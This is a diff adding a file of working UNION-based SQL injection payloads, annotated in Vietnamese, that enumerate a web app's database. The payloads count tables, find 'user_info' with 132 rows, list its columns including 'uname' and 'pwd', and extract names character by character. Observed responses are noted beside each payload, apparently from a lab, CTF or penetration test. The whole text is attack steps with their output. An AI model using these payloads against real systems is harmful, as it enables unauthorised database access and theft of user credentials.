@@ -1,0 +1,36 @@
+' UNION SELECT NULL,NULL,NULL,NULL FROM user_info-- - NULL không hiển thị ngược lại 1 hiển thị SUY RA chặn NULL
+
+-- Tên 
+
+--bảng và số dòng trong bảng
+' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database()-- - Hello, user_info!
+' UNION SELECT 1,CONCAT('Row count: ', COUNT(*)),3,4 FROM user_info-- - Row count: 132!
+
+
+-- Đếm số lượng bảng
+' UNION SELECT 1,COUNT(*),3,4 FROM information_schema.tables WHERE table_schema=database()-- - Hello, 1!
+-- Liệt kê tất cả bảng (dùng LIMIT để kiểm tra từng cái)
+' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1-- -
+' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1-- -
+
+-- Đếm số cột trong bảng user_info
+' UNION SELECT 1,COUNT(*),3,4 FROM information_schema.columns WHERE table_name='user_info'-- - Hello, 4!
+
+-- Xem tất cả cột (dùng LIMIT)
+-- Cột 1
+' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='user_info' LIMIT 0,1-- -
+-- Kết quả: id
+-- Cột 2
+' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='user_info' LIMIT 1,1-- -
+-- Kết quả: name
+-- Cột 3
+' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='user_info' LIMIT 2,1-- -
+-- Kết quả: uname
+-- Cột 4
+' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='user_info' LIMIT 3,1-- -
+-- Kết quả: pwd
+
+-- Lấy từng ký tự nếu bị giới hạn độ dài
+' UNION SELECT 1,SUBSTRING(table_name,1,1),3,4 FROM information_schema.tables LIMIT 1-- - Hello, i!
+' UNION SELECT 1,SUBSTRING(table_name,2,1),3,4 FROM information_schema.tables LIMIT 1-- -  Hello, n!
+
